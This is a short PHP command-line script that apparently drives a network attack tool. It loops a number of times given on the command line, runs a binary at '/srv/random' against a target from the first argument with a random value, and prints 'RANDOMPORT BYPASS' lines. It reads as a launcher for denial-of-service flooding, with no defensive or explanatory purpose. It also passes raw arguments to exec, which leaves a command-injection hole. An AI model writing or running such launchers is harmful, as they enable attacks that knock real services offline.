<?php
for ($x = 0; $x <= $argv[3]; $x++) {
	$rand = rand(1,30);
	exec('/srv/random '.$argv[1].' '.$rand.' -1 1');
	echo "RANDOMPORT BYPASS ...... ".$argv[1]." LOOP $x \n";
}
?>